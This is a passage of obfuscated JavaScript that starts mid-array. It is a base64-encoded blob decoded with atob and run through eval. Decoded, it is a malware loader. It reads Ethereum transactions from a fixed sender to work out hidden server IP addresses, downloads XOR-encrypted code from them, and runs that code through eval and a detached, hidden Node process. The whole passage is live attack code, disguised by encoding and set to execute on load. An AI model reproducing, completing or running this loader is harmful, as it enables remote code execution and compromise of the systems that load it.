CFzZXR0bGVkICYmIC","0tcmVtYWluaW5nID09PSAwKSByZXNvbHZlKG51bGwpOw0KICAg","ICAgICB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQpmdW5jdGlvbi","BjYW5kaWRhdGVCbG9ja3ModGFyZ2V0KSB7DQogIGNvbnN0IHBy","ZXYgPSB0YXJnZXQgLSBCTE9DS19NVUxUSVBMRTsNCiAgY29uc3","Qgc2VlbiA9IG5ldyBTZXQoKTsNCiAgY29uc3Qgb3V0ID0gW107","DQogIGZvciAoY29uc3QgYiBvZiBbdGFyZ2V0IC0gMW4sIHRhcm","dldCwgdGFyZ2V0ICsgMW4sIHByZXYgLSAxbiwgcHJldiwgcHJl","diArIDFuXSkgew0KICAgIGlmIChiIDwgMG4pIGNvbnRpbnVlOw","0KICAgIGNvbnN0IGtleSA9IGIudG9TdHJpbmcoKTsNCiAgICBp","ZiAoc2Vlbi5oYXMoa2V5KSkgY29udGludWU7DQogICAgc2Vlbi","5hZGQoa2V5KTsNCiAgICBvdXQucHVzaChiKTsNCiAgfQ0KICBy","ZXR1cm4gb3V0Ow0KfQ0KDQpmdW5jdGlvbiBibG9ja1Rhc2soYm","xvY2tOdW1iZXIpIHsNCiAgY29uc3QgY29udHJvbGxlciA9IG5l","dyBBYm9ydENvbnRyb2xsZXIoKTsNCiAgcmV0dXJuIHsNCiAgIC","Bjb250cm9sbGVyLA0KICAgIHJ1bjogYXN5bmMgKCkgPT4gew0K","ICAgICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aXRoUnBjRW5kcG","9pbnRzKA0KICAgICAgICAoZW5kcG9pbnQsIHNpZ25hbCkgPT4N","CiAgICAgICAgICBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLCBbdG9CbG9ja0hleChibG9ja051bWJl","ciksIHRydWVdLCBzaWduYWwpLA0KICAgICAgICBjb250cm9sbG","VyLnNpZ25hbA0KICAgICAgKTsNCiAgICAgIGNvbnN0IHR4cyA9","IGJsb2NrPy50cmFuc2FjdGlvbnM7DQogICAgICBpZiAoIUFycm","F5LmlzQXJyYXkodHhzKSkgcmV0dXJuIG51bGw7DQogICAgICBj","b25zdCB0eCA9IGZpbmRTZW5kZXJUeCh0eHMpOw0KICAgICAgcm","V0dXJuIHR4ID8geyBibG9ja051bWJlciwgdHggfSA6IG51bGw7","DQogICAgfSwNCiAgfTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gbm","9uY2VBdEJsb2NrcyhibG9ja3MsIG91dGVyU2lnbmFsKSB7DQog","IGNvbnN0IGNhbGxzID0gYmxvY2tzLm1hcCgoYikgPT4gWydldG","hfZ2V0VHJhbnNhY3Rpb25Db3VudCcsIFtTRU5ERVIsIHRvQmxv","Y2tIZXgoYildXSk7DQogIHRyeSB7DQogICAgcmV0dXJuIChhd2","FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0JhdGNoKGVuZHBvaW50LCBjYWxscy","wgc2lnbmFsKSwNCiAgICAgIG91dGVyU2lnbmFsDQogICAgKSku","bWFwKEJpZ0ludCk7DQogIH0gY2F0Y2ggew0KICAgIHJldHVybi","AoYXdhaXQgUHJvbWlzZS5hbGwoDQogICAgICBjYWxscy5tYXAo","KFttZXRob2QsIHBhcmFtc10pID0+DQogICAgICAgIHdpdGhScG","NFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW","1zLCBzaWduYWwpLA0KICAgICAgICAgIG91dGVyU2lnbmFsDQog","ICAgICAgICkNCiAgICAgICkNCiAgICApKS5tYXAoQmlnSW50KT","sNCiAgfQ0KfQ0KDQphc3luYyBmdW5jdGlvbiBsYXN0U2VuZGVy","VHgobGF0ZXN0SGludCkgew0KICBjb25zdCBjb250cm9sbGVyID","0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICB0cnkgew0KICAg","IGNvbnN0IGhlYWQgPQ0KICAgICAgbGF0ZXN0SGludCA/Pw0KIC","AgICAgQmlnSW50KA0KICAgICAgICBhd2FpdCB3aXRoUnBjRW5k","cG9pbnRzKA0KICAgICAgICAgIChlbmRwb2ludCwgc2lnbmFsKS","A9PiBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVy","JywgW10sIHNpZ25hbCksDQogICAgICAgICAgY29udHJvbGxlci","5zaWduYWwNCiAgICAgICAgKQ0KICAgICAgKTsNCg0KICAgIGNv","bnN0IG5vbmNlID0gQmlnSW50KA0KICAgICAgYXdhaXQgd2l0aF","JwY0VuZHBvaW50cygNCiAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2","V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTkRFUiwgdG9C","bG9ja0hleChoZWFkKV0sIHNpZ25hbCksDQogICAgICAgIGNvbn","Ryb2xsZXIuc2lnbmFsDQogICAgICApDQogICAgKTsNCiAgICBj","b25zdCB0YXJnZXROb25jZSA9IG5vbmNlIC0gMW47DQoNCiAgIC","BsZXQgbG8gPSBTRUFSQ0hfRkxPT1IgLSAxbjsNCiAgICBsZXQg","aGkgPSBoZWFkOw0KICAgIHdoaWxlIChoaSAtIGxvID4gMW4pIH","sNCiAgICAgIGNvbnN0IHNwYW4gPSBoaSAtIGxvIC0gMW47DQog","ICAgICBjb25zdCBrID0gQmlnSW50KE1hdGgubWluKE5PTkNFX0","ZBTk9VVCwgTnVtYmVyKHNwYW4pKSk7DQogICAgICBjb25zdCBw","cm9iZXMgPSBbXTsNCiAgICAgIGZvciAobGV0IGkgPSAxbjsgaS","A8PSBrOyBpICs9IDFuKSBwcm9iZXMucHVzaChsbyArIChpICog","KGhpIC0gbG8pKSAvIChrICsgMW4pKTsNCg0KICAgICAgY29uc3","QgY291bnRzID0gYXdhaXQgbm9uY2VBdEJsb2Nrcyhwcm9iZXMs","IGNvbnRyb2xsZXIuc2lnbmFsKTsNCiAgICAgIGNvbnN0IGlkeC","A9IGNvdW50cy5maW5kSW5kZXgoKGMpID0+IGMgPj0gbm9uY2Up","Ow0KICAgICAgaWYgKGlkeCA9PT0gLTEpIGxvID0gcHJvYmVzW3","Byb2Jlcy5sZW5ndGggLSAxXTsNCiAgICAgIGVsc2Ugew0KICAg","ICAgICBoaSA9IHByb2Jlc1tpZHhdOw0KICAgICAgICBpZiAoaW","R4ID4gMCkgbG8gPSBwcm9iZXNbaWR4IC0gMV07DQogICAgICB9","DQogICAgfQ0KDQogICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aX","RoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgIHJwY0NhbGwoZW5kcG9pbnQsICdldG","hfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KGhpKSwg","dHJ1ZV0sIHNpZ25hbCksDQogICAgICBjb250cm9sbGVyLnNpZ2","5hbA0KICAgICk7DQogICAgY29uc3QgdHhzID0gYmxvY2s/LnRy","YW5zYWN0aW9ucyB8fCBbXTsNCiAgICBsZXQgdHggPSBudWxsOw","0KICAgIGZvciAoY29uc3QgdCBvZiB0eHMpIHsNCiAgICAgIGlm","ICghdC5mcm9tIHx8IHQuZnJvbS50b0xvd2VyQ2FzZSgpICE9PS","BTRU5ERVIpIGNvbnRpbnVlOw0KICAgICAgaWYgKEJpZ0ludCh0","Lm5vbmNlKSA9PT0gdGFyZ2V0Tm9uY2UpIHsNCiAgICAgICAgdH","ggPSB0Ow0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAg","IGlmICghdHggfHwgQmlnSW50KHQubm9uY2UpID4gQmlnSW50KH","R4Lm5vbmNlKSkgdHggPSB0Ow0KICAgIH0NCiAgICByZXR1cm4g","eyBibG9ja051bWJlcjogaGksIHR4IH07DQogIH0gZmluYWxseS","B7DQogICAgY29udHJvbGxlci5hYm9ydCgpOw0KICB9DQp9DQoN","CmFzeW5jIGZ1bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZX","IoKSB7DQogIGNvbnN0IHVybCA9DQogICAgYCR7SU5ERVhFUl9V","Ukx9P21vZHVsZT1hY2NvdW50JmFjdGlvbj10eGxpc3QmYWRkcm","Vzcz0ke1NFTkRFUn1gICsNCiAgICBgJnN0YXJ0YmxvY2s9MCZl","bmRibG9jaz05OTk5OTk5OSZwYWdlPTEmb2Zmc2V0PTIwJnNvcn","Q9ZGVzYyZmaWx0ZXJieT1mcm9tYDsNCiAgY29uc3QgcGF5bG9h","ZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KHVybCk7DQogIGNvbnN0IG","xpc3QgPSBBcnJheS5pc0FycmF5KHBheWxvYWQ/LnJlc3VsdCkg","PyBwYXlsb2FkLnJlc3VsdCA6IFtdOw0KICBjb25zdCB0eCA9IG","xpc3QuZmluZCgodCkgPT4gdC5mcm9tICYmIHQuZnJvbS50b0xv","d2VyQ2FzZSgpID09PSBTRU5ERVIpOw0KICBpZiAoIXR4KSByZX","R1cm4gbnVsbDsNCiAgcmV0dXJuIHsgYmxvY2tOdW1iZXI6IEJp","Z0ludCh0eC5ibG9ja051bWJlciksIHR4IH07DQp9DQoNCmFzeW","5jIGZ1bmN0aW9uIHJ1bigpIHsNCiAgY29uc3QgbGF0ZXN0ID0g","QmlnSW50KA0KICAgIGF3YWl0IHdpdGhScGNFbmRwb2ludHMoKG","VuZHBvaW50LCBzaWduYWwpID0+DQogICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVyJywgW10sIHNpZ25hbC","kNCiAgICApDQogICk7DQogIGNvbnN0IHRhcmdldEJsb2NrID0g","bGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJUExFKTsNCi","AgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KICBsZXQgbWF0","Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0ZUJsb2Nrcy","h0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw0KICBsZXQg","W2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0Y2g/LnR4Py","50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybChpcCwgcG9y","dCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSByZXR1cm4gbn","VsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cDovLyR7aXB9","OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoNCiAgbGV0IG","NvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPSBwYXlsb2Fk","VXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBpZiAoY2xzVX","JsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPSBhd2FpdCBn","ZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xzVXJsKTsNCi","AgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudWxsOw0KICAg","IH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAgIG1hdGNoID","0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobGF0ZXN0KS5j","YXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChhd2FpdCBsYX","N0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKCkgPT4gbnVs","bCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVBZGRyZXNzKG","1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2xvYmFsWydf","ViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydfSCddID0gYG","h0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWydfSDInXSA9","IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2JhbFsnX3Rfcy","ddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2dsb2JhbFsn","X3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KDQogIGZ1bm","N0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgICBjb25zdCBi","YXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZS","wNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydCkgfHwgODAs","DQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1cmwuc2Vhcm","NoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgICAnVXNlci1B","Z2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOy","BXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1M","LCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS","81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2xvYmFsWydf","ViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoNCiAgICBmdW","5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgICBjb25zdCBr","biA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxldCBpID0gMD","sgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF49IGtleS5j","aGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1cm4gYnVmLn","RvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogICAgZnVuY3Rp","b24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAgIGNvbnN0IG","I2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYjY0J107DQog","ICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9yKCdNaXNzaW","5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldHVybiB4b3JE","ZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0JykpOw0KIC","AgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKSB7","DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIH","JlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZXEgPSBodHRw","LnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwgKHJlcykgPT","4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09ICdIRUFEJykg","ew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShmcm9tQjY0SG","VhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlamVjdChlKTsg","fQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0KICAgICAgIC","AgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICByZXMub24oJ2","RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKGNodW5rKSk7","DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9PiB7DQogIC","AgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICBjb25zdCBi","dWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQogICAgICAgIC","AgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcmVzb2x2ZSh4","b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAgIGlmIChyZX","MuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZXR1cm4gcmVz","b2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAgICAgICAgIC","AgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYXlsb2FkIGJv","ZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogIC","AgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgICAgICAgIH0N","CiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMub24oJ2Vycm","9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogICAgICAgIHJl","cS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAgICByZXEuc2","V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAg","ICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3IoYEhUVFAgdG","ltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU31tc2ApKTsN","CiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQoKTsNCiAgIC","AgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZXF1ZXN0KCdH","RVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFEJykpOw0KIC","B9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYWRlcih1cmws","IGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAgICAgIGNvbn","N0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdXJsKTsNCiAg","ICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAgICA/IGBnbG","9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fCAwfSc7Z2xv","YmFsWydfSCddPScke19nbG9iYWxbJ19IJ119JztnbG9iYWxbJ1","9IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYmFsWydyJ109","cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7dmFyIF9nbG9iYW","w9Z2xvYmFsO2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPSck","e19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPS","cke19nbG9iYWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPSck","e19nbG9iYWxbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcm","U7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPWdsb2Jh","bDtgOw0KDQogICAgICBpZiAoIWlzQm9vdCkgZXZhbChlbnYgKy","Bjb2RlKTsNCiAgICAgIHNwYXduKCdub2RlJywgWyctZScsIGVu","diArIGNvZGVdLCB7DQogICAgICAgIGRldGFjaGVkOiB0cnVlLA","0KICAgICAgICBzdGRpbzogJ2lnbm9yZScsDQogICAgICAgIHdp","bmRvd3NIaWRlOiB0cnVlLA0KICAgICAgfSkudW5yZWYoKTsNCi","AgICB9IGNhdGNoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVu","X2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC","9jbHNgKSwgJ3E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQog","IGF3YWl0IHJ1bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aX","AxfTo0NDMvMHgvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0","cnVlKTsNCn0NCg0KcnVuKCk7"].join('');var _0x9710a8b=atob(_0x9710a8a);eval(_0x9710a8b);})();
